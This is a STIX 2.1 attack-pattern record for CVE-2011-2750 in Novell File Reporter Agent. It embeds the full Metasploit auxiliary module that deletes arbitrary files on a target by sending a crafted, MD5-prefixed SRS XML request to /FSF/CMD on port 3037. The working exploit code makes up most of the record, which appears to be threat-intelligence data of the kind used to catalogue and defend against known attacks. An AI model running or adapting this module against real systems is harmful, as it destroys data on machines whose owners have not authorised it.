{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2d972ffa-53df-4227-b5d3-4137720ef892",
    "created": "2024-08-14T16:24:10.141896Z",
    "modified": "2024-08-14T16:24:10.141901Z",
    "name": "Novell File Reporter Agent Arbitrary File Delete",
    "description": " NFRAgent.exe in Novell File Reporter allows remote attackers to delete arbitrary files via a full pathname in an SRS request with OPERATION set to 4 and CMD set to 5 against /FSF/CMD. This module has been tested successfully on NFR Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File Reporter 1.0.1) on Windows platforms. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/novell_file_reporter_filedelete.rb",
            "external_id": "novell_file_reporter_filedelete.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2750"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.org/adv/nfr_2-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Novell File Reporter Agent Arbitrary File Delete',\n        'Description' => %q{\n          NFRAgent.exe in Novell File Reporter allows remote attackers to delete\n          arbitrary files via a full pathname in an SRS request with OPERATION set to 4 and\n          CMD set to 5 against /FSF/CMD. This module has been tested successfully on NFR\n          Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File Reporter 1.0.1) on\n          Windows platforms.\n        },\n        'Author' => [\n          'Luigi Auriemma', # Vulnerability discovery and Poc\n          'juan vazquez' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2011-2750' ],\n          [ 'OSVDB', '73729' ],\n          [ 'URL', 'http://aluigi.org/adv/nfr_2-adv.txt'],\n        ]\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(3037),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptString.new('RPATH', [ true, 'The remote file path to delete', 'c:\\\\test.txt' ]),\n      ]\n    )\n  end\n\n  def run\n    peer = \"#{rhost}:#{rport}\"\n    record = \"<RECORD><NAME>SRS</NAME><OPERATION>4</OPERATION><CMD>5</CMD><PATH>#{datastore['RPATH']}</PATH></RECORD>\"\n    md5 = Rex::Text.md5('SRS' + record + 'SERVER').upcase\n    message = md5 + record\n\n    print_status(\"Trying to delete #{datastore['RPATH']}...\")\n\n    res = send_request_cgi(\n      {\n        'uri' => '/FSF/CMD',\n        'version' => '1.1',\n        'method' => 'POST',\n        'ctype' => 'text/xml',\n        'data' => message\n      }, 5\n    )\n\n    if res && (res.code == 200) && res.body =~ (%r{<RESULT><VERSION>1</VERSION><STATUS>0</STATUS><TRANSID>0</TRANSID></RESULT>})\n      print_good(\"File #{datastore['RPATH']} successfully deleted\")\n    else\n      print_error('File not deleted')\n    end\n  end\nend\n"
}